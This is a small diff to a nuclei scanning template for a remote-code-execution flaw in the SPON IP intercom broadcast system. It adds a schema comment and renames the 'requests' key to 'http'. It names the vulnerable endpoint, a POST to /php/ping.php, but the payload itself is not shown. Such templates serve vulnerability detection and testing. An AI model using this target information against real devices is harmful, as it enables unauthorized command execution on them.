@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: SPON-IP-rce
 info:
   name: SPON IP 网络对讲广播系统 rce
@@ -5,7 +6,7 @@ info:
   severity: high
   reference: https://poc.shuziguanxing.com/?#/publicIssueInfo#issueId=4578
   tags: SPON,rce
-requests:
+http:
   - raw:
       - |
         POST /php/ping.php HTTP/1.1
